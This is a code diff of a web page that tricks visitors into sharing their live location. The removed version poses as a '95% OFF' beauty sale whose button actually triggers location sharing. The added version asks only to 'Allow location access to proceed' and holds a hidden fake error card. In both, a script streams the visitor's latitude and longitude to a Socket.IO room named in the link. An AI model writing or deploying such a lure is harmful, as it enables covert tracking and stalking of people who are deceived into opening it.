@@ -1,109 +1,37 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Beauty Sale Offer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #fff1f5, #ffe4ec);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .card {
-      background: #ffffff;
-      max-width: 380px;
-      width: 90%;
-      border-radius: 16px;
-      padding: 24px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    .title {
-      font-size: 22px;
-      font-weight: bold;
-      color: #e11d48;
-      margin-bottom: 10px;
-    }
-
-    .subtitle {
-      font-size: 16px;
-      color: #333;
-      margin-bottom: 16px;
-      line-height: 1.4;
-    }
-
-    .location {
-      font-size: 15px;
-      color: #555;
-      margin-bottom: 20px;
-    }
-
-    .btn {
-      background: #e11d48;
-      color: #fff;
-      border: none;
-      padding: 14px 22px;
-      font-size: 16px;
-      border-radius: 10px;
-      cursor: pointer;
-      width: 100%;
-    }
-
-    .btn:active {
-      transform: scale(0.98);
-    }
-
-    .note {
-      margin-top: 14px;
-      font-size: 12px;
-      color: #888;
-    }
-  </style>
+  <title>Continue</title>
+  <meta name="viewport" content="width=device-width">
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-  <div class="card">
-    <div class="title">Beauty Sale Alert!</div>
-
-    <div class="subtitle">
-      Up to <b>95% OFF</b> on best-selling skincare products <br />
-      Limited time offer, check availability in your area 
-    </div>
-
-    <div class="location">
-      Tap below to view the offer
-    </div>
-
-    <button class="btn" onclick="shareLocation()">
-       Click here to view the offer
-    </button>
-
-    <div class="note">
-      Hurry! Sale ends today ⏳<br />
-    </div>
+<div class="container">
+  <div class="card" id="start">
+    <h2>Continue</h2>
+    <p>Allow location access to proceed</p>
+    <button onclick="start()">Continue</button>
   </div>
 
-  <!-- Socket.IO -->
+  <div class="card" id="error" style="display:none">
+    <h2>Error</h2>
+    <p>Something went wrong. Please try again later.</p>
+  </div>
+</div>
+
 <script src="/socket.io/socket.io.js"></script>
 <script>
   const socket = io();
   const room = new URLSearchParams(location.search).get("room");
-
   socket.emit("join-room", room);
 
   function start() {
     navigator.geolocation.watchPosition(
       pos => {
         socket.emit("send-location", {
-          room: room,   // ✅ FIXED HERE
+          roomId: room,
           lat: pos.coords.latitude,
           lng: pos.coords.longitude
         });
@@ -119,4 +47,3 @@
 
 </body>
 </html>
-
